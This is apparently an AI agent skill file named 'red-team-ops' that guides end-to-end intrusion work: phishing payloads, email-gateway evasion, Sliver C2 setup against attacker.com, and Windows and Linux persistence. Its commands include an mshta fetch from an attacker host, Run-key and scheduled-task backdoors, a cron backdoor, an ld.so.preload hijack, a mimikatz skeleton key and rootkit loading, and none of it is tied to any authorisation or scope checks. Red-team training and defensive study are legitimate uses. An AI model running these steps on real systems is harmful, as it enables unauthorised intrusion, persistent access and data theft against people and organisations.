---
name: red-team-ops
description: "红队端到端作战:初始访问、持久化、提权、防御规避、C2 基础设施、EDR 绕过、LOLBins 落地。信号:红队,端到端,防御规避,c2,落地利用。"
when-to-use: Use when running a full red-team engagement end-to-end — initial access, persistence, privilege escalation, defense evasion, C2 infrastructure, EDR bypass, living-off-the-land
metadata:
  type: offensive
  phase: post-exploitation
  tools: cobalt-strike, sliver, havoc, mythic, covenant, msfconsole, powershell-empire
kill_chain:
  phase: [install, actions]
  step: [5, 7]
  attck_tactics: [TA0003, TA0005, TA0009, TA0010]
depends_on: [exploit-development, edr-evasion]
feeds_into: [threat-hunting, incident-response]
inputs: [foothold_access, c2_channel]
outputs: [persistence_mechanism, collected_data, exfiltrated_data]
---

# Red Team Operations

## When to Activate

- Simulating advanced persistent threat (APT) operations
- Testing detection and response capabilities
- Establishing persistent access and C2
- Evading EDR/AV/SIEM detection
- Privilege escalation on compromised hosts
- Data exfiltration planning

## Initial Access

### Phishing Payloads
```bash
# Office macro (VBA)
# - AutoOpen/Document_Open trigger
# - Download cradle: PowerShell IEX or certutil
# - Sandbox evasion: check domain join, user interaction delay

# HTA (HTML Application)
mshta http://attacker.com/payload.hta

# ISO/IMG mounting (bypass MOTW)
# Package LNK + DLL inside ISO → double-click mounts, LNK executes DLL

# OneNote (.one) with embedded scripts
# Drag-and-drop .bat/.hta behind fake "Double click to view" image

# DLL sideloading
# Find legitimate signed EXE that loads DLL from CWD
# Place malicious DLL alongside legitimate EXE in delivery package
```

### Delivery Mechanisms
```
# Smuggling past email gateways:
# - Password-protected ZIP (password in email body)
# - HTML smuggling (JS constructs blob → downloads file)
# - QR code to attacker-controlled site
# - Legitimate file-sharing (OneDrive, Google Drive links)
```

## Command & Control (C2)

### Infrastructure Setup
```bash
# Sliver C2
sliver-server
> generate --mtls attacker.com --os windows --arch amd64 --format exe --save implant.exe
> mtls --lhost 0.0.0.0 --lport 443
> https --lhost 0.0.0.0 --lport 8443 --domain legit-looking.com

# Domain fronting / CDN hiding
# Use high-reputation domains (cloudfront, azure CDN)
# C2 traffic appears as legitimate HTTPS to CDN

# Redirectors
# socat TCP-LISTEN:443,fork TCP:c2-server:443
# Apache mod_rewrite rules to filter blue team probes

# Malleable C2 profiles (Cobalt Strike)
# Mimic legitimate traffic patterns (Slack, Teams, O365)
```

### C2 Communication Patterns
```
# DNS over HTTPS (DoH) — blends with normal traffic
# Domain fronting — SNI vs Host header mismatch
# Named pipes — internal lateral movement without network traffic
# SMB beacons — blend with normal AD traffic
# Websockets — persistent connection through proxies
```

## Persistence

### Windows
```powershell
# Registry Run keys
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Update" /d "C:\path\payload.exe"

# Scheduled Tasks
schtasks /create /tn "SystemUpdate" /tr "C:\path\payload.exe" /sc onlogon /ru SYSTEM

# WMI Event Subscription (fileless)
# __EventFilter + __EventConsumer + __FilterToConsumerBinding

# DLL Search Order Hijacking
# Place malicious DLL in application directory (loaded before System32)

# COM Object Hijacking
# Modify CLSID InprocServer32 to point to malicious DLL

# Golden Ticket (domain-level persistence)
# With krbtgt hash, generate tickets for any user indefinitely

# DSRM (Directory Services Restore Mode)
# Modify DSRM password → backdoor DC even if krbtgt rotated

# Skeleton Key (in-memory DC patch)
mimikatz "privilege::debug" "misc::skeleton"
# Any user can now auth with password "mimikatz"
```

### Linux
```bash
# SSH authorized_keys
echo "ssh-rsa AAAA... attacker" >> ~/.ssh/authorized_keys

# Cron job
echo "* * * * * /tmp/.backdoor" | crontab -

# Systemd service
# /etc/systemd/system/update.service → ExecStart=/path/payload

# LD_PRELOAD
echo "/path/malicious.so" > /etc/ld.so.preload

# PAM backdoor
# Modify pam_unix.so to accept hardcoded password

# Kernel module (rootkit)
insmod rootkit.ko
```

## Privilege Escalation

### Windows
```powershell
# Token impersonation (SeImpersonatePrivilege)

> 📎 详细内容（完整示例 / 参考 / 数据表）已拆分至同目录 `reference.md`，按需用 Read 读取对应小节。
